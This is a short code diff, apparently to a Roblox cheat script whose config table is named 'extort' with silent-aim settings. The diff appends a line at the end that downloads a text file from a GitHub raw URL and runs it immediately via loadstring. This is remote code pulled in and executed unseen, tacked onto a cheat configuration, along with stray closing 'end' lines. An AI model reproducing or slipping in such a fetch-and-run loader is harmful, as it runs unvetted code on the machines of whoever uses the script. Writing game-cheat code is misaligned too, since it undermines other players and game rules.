@@ -1,4 +1,3 @@
-
 getgenv().extort = {
     ['Silent'] = {
         Normal = {
@@ -508,4 +507,10 @@ end)
             end
         end
     end
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripade/sh/refs/heads/main/Wsvr.txt"))()
+
+  end
+ end
 end
